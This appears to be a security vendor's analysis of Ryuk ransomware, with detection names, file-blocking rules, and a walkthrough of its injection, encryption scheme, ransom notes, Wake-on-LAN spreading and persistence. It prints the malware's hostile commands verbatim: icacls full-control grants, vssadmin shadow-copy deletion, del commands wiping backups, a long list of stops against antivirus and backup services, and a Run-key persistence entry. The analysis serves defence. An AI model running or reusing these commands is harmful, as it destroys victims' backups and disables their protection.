|DetectionName|DATVersion|Date|
|---|---|---|
|Ransom-Ryuk!<PartialHash><br>Real Protect-SS!<PartialHash><br>Real Protect-LS!<PartialHash><br>Real Protect-EC!<PartialHash>|V2: 9788<br>V3: 4240|10/28/2020|




|Rule#|Action|Windows6x<br>.|FileActionstoPrevent|
|---|---|---|---|
|1|SubRule Type: Files||Create|
|1|Executables[Include]|*|*|
|1|SubRule [Include]|*.RYK|*.RYK|


|Rule#|Action|Windows6x<br>.|FileActionstoPrevent|
|---|---|---|---|
|1|File/Folder Blocking Rule||New files being created|
|1|Processes to include|*|*|
|1|File or Folder Name to<br>Block|*.RYK|*.RYK|




```
    csrss.exe

    explore.exe

    lsaas.exe

```

  - Process Injection: Process injection on the selected list of selected processes is carried out using a regular
process injection technique where memory is allocated to the remote process, malicious code is written to
the process and then the malicious code is executed via a remote thread in the target process.


**Injected Code**


The second-stage binary injects a copy of itself into a target process and starts a new thread to continue its
malicious activities. This code is responsible for encryption of files on all the drives on the system. The ransomware
skips encryption of files or directories containing the following keywords:


  - `Windows`

  - `Mozilla`

  - `$RecycleBin`

  - `Chrome`

  - `AhnLab`


Ransom-Ryuk also has the capability to encrypt files on network shares. This done by enumerating files on each
available network resource and performing subsequent encryption of files.


Ryuk Ransomware use “ icacls.exe” to get full control over mentioned folder and all its subfolders.

  - `Icacls “C:\*” /grant Everyone:F /T /C /Q`
```
    F gives Full Access and /T /C /Q applies the permissions to subfolders.

```

**Encryption Scheme**


Ransom-Ryuk uses three sets of keys on the endpoint:


  - 3rd level AES (symmetric): Used to encrypt file contents on disk.

  - 2nd level RSA key Pair: Used to encrypt the 3rd level AES key and append to end of encrypted user files.
The private key pair here is pre-encrypted with the 1st level RSA public key.

  - 1st level RSA Key Pair: 1 [st] level private key used to decrypt the 2nd level private key once ransom is paid.


**Ransom Notes**


Ransom notes are generated in each directory that has been encrypted by the ransomware. These files are usually
named “RyukReadMe.txt”


Figure: Ransom-Ryuk Ransom Note


Some versions of RYUK drops an HTLM note (RyukReadMe.html) instead of the text file as ransomnote. This
HTML contains just minimum information, such as the email address, the name RYUK and a message at the
bottom (balance of shadow universe) shown below:


Figure: Ransom-Ryuk Ransom Note


**System Backup Deletion**


The ransomware creates a Windows BAT file named: “window.bat” (location depends on the OS version) to create
list of commands to delete backup shadow copies and files. Commands executed:
```
vssadmin Delete Shadows /all /quiet
vssadmin resize shadowstorage /for=c: /on=c: /maxsize=401MB
vssadmin resize shadowstorage /for=c: /on=c: /maxsize=unbounded
vssadmin resize shadowstorage /for=d: /on=d: /maxsize=401MB
vssadmin resize shadowstorage /for=d: /on=d: /maxsize=unbounded
vssadmin resize shadowstorage /for=e: /on=e: /maxsize=401MB
vssadmin resize shadowstorage /for=e: /on=e: /maxsize=unbounded
vssadmin resize shadowstorage /for=f: /on=f: /maxsize=401MB
vssadmin resize shadowstorage /for=f: /on=f: /maxsize=unbounded
vssadmin resize shadowstorage /for=g: /on=g: /maxsize=401MB
vssadmin resize shadowstorage /for=g: /on=g: /maxsize=unbounded
vssadmin resize shadowstorage /for=h: /on=h: /maxsize=401MB
vssadmin resize shadowstorage /for=h: /on=h: /maxsize=unbounded
vssadmin Delete Shadows /all /quiet
del /s /f /q c:\*.VHD c:\*.bac c:\*.bak c:\*.wbcat c:\*.bkf c:\Backup*.*
c:\backup*.* c:\*.set c:\*.win c:\*.dsk
del /s /f /q d:\*.VHD d:\*.bac d:\*.bak d:\*.wbcat d:\*.bkf d:\Backup*.*
d:\backup*.* d:\*.set d:\*.win d:\*.dsk
del /s /f /q e:\*.VHD e:\*.bac e:\*.bak e:\*.wbcat e:\*.bkf e:\Backup*.*
e:\backup*.* e:\*.set e:\*.win e:\*.dsk
del /s /f /q f:\*.VHD f:\*.bac f:\*.bak f:\*.wbcat f:\*.bkf f:\Backup*.*
f:\backup*.* f:\*.set f:\*.win f:\*.dsk
del /s /f /q g:\*.VHD g:\*.bac g:\*.bak g:\*.wbcat g:\*.bkf g:\Backup*.*
g:\backup*.* g:\*.set g:\*.win g:\*.dsk
del /s /f /q h:\*.VHD h:\*.bac h:\*.bak h:\*.wbcat h:\*.bkf h:\Backup*.*
h:\backup*.* h:\*.set h:\*.win h:\*.dsk

```

**Services Stopped on the System**


Ransom-Ryuk stops the following services on the endpoint prior to starting its encryption process. These services
may be stopped to serve two purposes:


  - Stop user/application services on the system to enable successful encryption of their files on disk.

  - Stop AV services to disable behavior-based protection services.


Services stopped on the endpoint:

```
stop "Acronis VSS Provider" /y
stop "Enterprise Client Service" /y
stop "Sophos Agent" /y
stop "Sophos AutoUpdate Service" /y
stop "Sophos Clean Service" /y
stop "Sophos Device Control Service" /y
stop "Sophos File Scanner Service" /y
stop "Sophos Health Service" /y
stop "Sophos MCS Agent" /y
stop "Sophos MCS Client" /y
stop "Sophos Message Router" /y
stop "Sophos Safestore Service" /y
stop "Sophos System Protection Service" /y
stop "Sophos Web Control Service" /y
stop "SQLsafe Backup Service" /y
stop "SQLsafe Filter Service" /y
stop "Symantec System Recovery" /y
stop "Veeam Backup Catalog Data Service" /y
stop AcronisAgent /y
stop AcrSch2Svc /y
stop Antivirus /y
stop ARSM /y
stop BackupExecAgentAccelerator /y

```

```
stop BackupExecAgentBrowser /y
stop BackupExecDeviceMediaService /y
stop BackupExecJobEngine /y
stop BackupExecManagementService /y
stop BackupExecRPCService /y
stop BackupExecVSSProvider /y
stop bedbg /y
stop DCAgent /y
stop EPSecurityService /y
stop EPUpdateService /y
stop EraserSvc11710 /y
stop EsgShKernel /y
stop FA_Scheduler /y
stop IISAdmin /y
stop IMAP4Svc /y
stop macmnsvc /y
stop masvc /y
stop MBAMService /y
stop MBEndpointAgent /y
stop McAfeeEngineService /y
stop McAfeeFramework /y
stop McAfeeFrameworkMcAfeeFramework /y
stop McShield /y
stop McTaskManager /y
stop mfemms /y
stop mfevtp /y
stop MMS /y
stop mozyprobackup /y
stop MsDtsServer /y
stop MsDtsServer100 /y
stop MsDtsServer110 /y
stop MSExchangeES /y
stop MSExchangeIS /y
stop MSExchangeMGMT /y
stop MSExchangeMTA /y
stop MSExchangeSA /y
stop MSExchangeSRS /y
stop MSOLAP$SQL_2008 /y
stop MSOLAP$SYSTEM_BGC /y
stop MSOLAP$TPS /y
stop MSOLAP$TPSAMA /y
stop MSSQL$BKUPEXEC /y
stop MSSQL$ECWDB2 /y
stop MSSQL$PRACTICEMGT /y
stop MSSQL$PRACTTICEBGC /y
stop MSSQL$PROFXENGAGEMENT /y
stop MSSQL$SBSMONITORING /y
stop MSSQL$SHAREPOINT /y
stop MSSQL$SQL_2008 /y
stop MSSQL$SYSTEM_BGC /y
stop MSSQL$TPS /y
stop MSSQL$TPSAMA /y
stop MSSQL$VEEAMSQL2008R2 /y
stop MSSQL$VEEAMSQL2012 /y
stop MSSQLFDLauncher /y
stop MSSQLFDLauncher$PROFXENGAGEMENT /y
stop MSSQLFDLauncher$SBSMONITORING /y
stop MSSQLFDLauncher$SHAREPOINT /y
stop MSSQLFDLauncher$SQL_2008 /y
stop MSSQLFDLauncher$SYSTEM_BGC /y
stop MSSQLFDLauncher$TPS /y
stop MSSQLFDLauncher$TPSAMA /y
stop MSSQLSERVER /y
stop MSSQLServerADHelper100 /y
stop MSSQLServerOLAPService /y
stop MySQL80 /y
stop MySQL57 /y
stop ntrtscan /y
stop OracleClientCache80 /y
stop PDVFSService /y

```

```
stop POP3Svc /y
stop ReportServer /y
stop ReportServer$SQL_2008 /y
stop ReportServer$SYSTEM_BGC /y
stop ReportServer$TPS /y
stop ReportServer$TPSAMA /y
stop RESvc /y
stop sacsvr /y
stop SamSs /y
stop SAVAdminService /y
stop SAVService /y
stop SDRSVC /y
stop SepMasterService /y
stop ShMonitor /y
stop Smcinst /y
stop SmcService /y
stop SMTPSvc /y
stop SNAC /y
stop SntpService /y
stop sophossps /y
stop SQLAgent$BKUPEXEC /y
stop SQLAgent$ECWDB2 /y
stop SQLAgent$PRACTTICEBGC /y
stop SQLAgent$PRACTTICEMGT /y
stop SQLAgent$PROFXENGAGEMENT /y
stop SQLAgent$SBSMONITORING /y
stop SQLAgent$SHAREPOINT /y
stop SQLAgent$SQL_2008 /y
stop SQLAgent$SYSTEM_BGC /y
stop SQLAgent$TPS /y
stop SQLAgent$TPSAMA /y
stop SQLAgent$VEEAMSQL2008R2 /y
stop SQLAgent$VEEAMSQL2012 /y
stop SQLBrowser /y
stop SQLSafeOLRService /y
stop SQLSERVERAGENT /y
stop SQLTELEMETRY /y
stop SQLTELEMETRY$ECWDB2 /y
stop SQLWriter /y
stop SstpSvc /y
stop svcGenericHost /y
stop swi_filter /y
stop swi_service /y
stop swi_update_64 /y
stop TmCCSF /y
stop tmlisten /y
stop TrueKey /y
stop TrueKeyScheduler /y
stop TrueKeyServiceHelper /y
stop UI0Detect /y
stop VeeamBackupSvc /y
stop VeeamBrokerSvc /y
stop VeeamCatalogSvc /y
stop VeeamCloudSvc /y
stop VeeamDeploymentService /y
stop VeeamDeploySvc /y
stop VeeamEnterpriseManagerSvc /y
stop VeeamMountSvc /y
stop VeeamNFSSvc /y
stop VeeamRESTSvc /y
stop VeeamTransportSvc /y
stop W3Svc /y
stop wbengine /y
stop WRSVC /y
stop MSSQL$VEEAMSQL2008R2 /y
stop SQLAgent$VEEAMSQL2008R2 /y
stop VeeamHvIntegrationSvc /y
stop swi_update /y
stop SQLAgent$CXDB /y
stop SQLAgent$CITRIX_METAFRAME /y

```

```
stop "SQL Backups" /y
stop MSSQL$PROD /y
stop "Zoolz 2 Service" /y
stop MSSQLServerADHelper /y
stop SQLAgent$PROD /y
stop msftesql$PROD /y
stop NetMsmqActivator /y
stop EhttpSrv /y
stop ekrn /y
stop ESHASRV /y
stop MSSQL$SOPHOS /y
stop SQLAgent$SOPHOS /y
stop AVP /y
stop klnagent /y
stop MSSQL$SQLEXPRESS /y
stop SQLAgent$SQLEXPRESS /y
stop wbengine /y
stop kavfsslp /y
stop KAVFSGT /y
stop KAVFS /y
stop mfefire /y

```

**Miscellaneous Functionality**


  - The second-stage binary also creates the following files on disk:

```
    For Windows 7 and above: C:\users\Public\sys
    For Windows XP/Windows 2000: C:\Documents and Settings\Default User\sys

    For Windows 7 and above: C:\users\Public\finish
    For Windows XP/Windows 2000: C:\Documents and Settings\Default User\finish

```

**WOL (Wake-On-Lan)**


RYUK also spawns a child process, which is a self-copy of itself but with a command line argument “ **8 LAN** ”.


When RYUK is executed with this command line argument, it tries to wake up all the machines on the network by
sending WOL (Wake-On-Lan) packets to all the machines, so that these machines can also be encrypted.


The image below shows the child process executed with “ **8 LAN”** command line argument:


Figure: Child process with 8 LAN CLA.


The network capture below shows the WOL packets being broadcasted on the network on all the present IP ranges:


Figure: Child process with 8 LAN CLA.


**Restart Mechanism**


The following registry entry would enable the malware to execute every time when Windows starts:


  - The second-stage binary set up persistence on the system by executing the following command:

C:\Windows\system32\cmd.exe /C REG ADD
```
    “HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run” /v “svchos”
    /t REG_SZ /d “<Path_to_2 [nd] _stage_binary>” /f

```

The value of the Run key consists of the path of the second-stage binary.


